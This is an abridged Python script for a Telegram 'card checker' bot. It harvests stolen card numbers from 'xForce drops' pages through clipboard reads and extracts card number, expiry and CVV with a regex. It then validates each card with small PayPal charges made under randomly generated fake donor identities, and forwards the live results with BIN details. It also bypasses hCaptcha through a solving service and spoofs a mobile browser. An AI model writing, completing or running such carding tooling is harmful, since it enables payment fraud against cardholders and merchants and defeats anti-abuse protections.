#!/usr/bin/env python3
"""
Telegram Card Checker Bot – Full xForce drops (fixed error classification, large address DB)
...
# ======================================================================
import capsolver
CAPSOLVER_API_KEY = "YOUR_CAPSOLVER_API_KEY_HERE"  # Replace with your CapSolver key if available
capsolver.api_key = CAPSOLVER_API_KEY

async def solve_hcaptcha(page):
    try:
        iframe = await page.wait_for_selector('iframe[src*="hcaptcha"]', timeout=15000)
        if not iframe:
            return True
            ...
            if token:
                await page.evaluate(f"""
                    () => {{
                        ...
                        if (typeof hcaptcha !== 'undefined') hcaptcha.submit('{token}');
                    }}
                """)
                await page.wait_for_timeout(3000)
                return True
        # Fallback: try to click checkbox
        try:
            checkbox = await page.wait_for_selector('iframe[src*="hcaptcha"][src*="checkbox"]', timeout=8000)
            if checkbox:
...
def extract_card_from_text(text: str):
    full = re.search(r'(\d{15,16})\|(\d{2})\|(\d{3,4})\|([A-Za-z ]+)\|', text)
    if full:
        card = full.group(1)
        mm = full.group(2)
        cvv = full.group(3)
...
# ======================================================================
# Enhanced PayPal Charger – large random address database, correct error classification
# ======================================================================
...
class PayPalCharger:
    ...
    def charge(self, cc: str) -> str:
        ...
        logger.info(f"[PayPal] Checking {n[:4]}...{n[-4:]} with donor {donor['first_name']} {donor['last_name']} ({donor['email']}), amount=${amount:.2f}")
        try:
...
class XForceAutomator:
    ...
    async def _get_clipboard(self, page):
        try:
            return await page.evaluate("async () => { try { return await navigator.clipboard.readText(); } catch(e) { return ''; } }") or ""
        except:
            return ""
    ...
    async def check_and_forward(self, n, mm, yy, cvv):
        ...
        resp_text = paypal_result.split("|",1)[-1] if "|" in paypal_result else paypal_result
        msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n[❃] 𝗥𝗲𝘀𝗽    ➜ {resp_text}\n"
        if bin_info:
            msg += (f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n"
        ...
        try:
            async with async_playwright() as p:
                ...
                ctx = await browser.new_context(
                    user_agent="Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/124.0.6367.82 Mobile Safari/537.36",
                    viewport={"width": 390, "height": 844},
                    permissions=["clipboard-read", "clipboard-write"],
                )
                page = await ctx.new_page()
                await page.goto(resolved, wait_until="domcontentloaded", timeout=120000)
                ...
                if await self._click_copy_button(page):
                    ...
                    if clipboard:
                        card = extract_card_from_text(clipboard)
                        if card:
                            n, mm, yy, cvv = card
    ...
    async def on_message(self, event):
        ...
        if card:
            await self.check_and_forward(*card)
